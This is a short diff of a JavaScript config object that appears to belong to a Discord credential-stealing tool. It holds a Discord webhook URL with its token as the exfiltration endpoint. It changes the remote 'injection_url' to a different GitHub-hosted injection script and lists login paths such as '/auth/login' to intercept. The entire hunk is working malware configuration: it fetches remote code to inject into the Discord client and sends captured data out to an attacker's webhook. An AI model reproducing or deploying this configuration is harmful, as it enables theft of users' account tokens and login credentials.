@@ -11,7 +11,7 @@ const CONFIG = {
   webhook:
     "https://discord.com/api/webhooks/1240687565141577779/JAzwR2xEbYaC8vbnEw5dtZOiBpYgYzWfbrVApOITjMh2MYO7W7o3IqD7oRav1fZljgtH",
   injection_url:
-    "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    "https://raw.githubusercontent.com/Nyxoy201/Morpheus-Injection/main/index.js",
   filters: {
     urls: [
       "/auth/login",
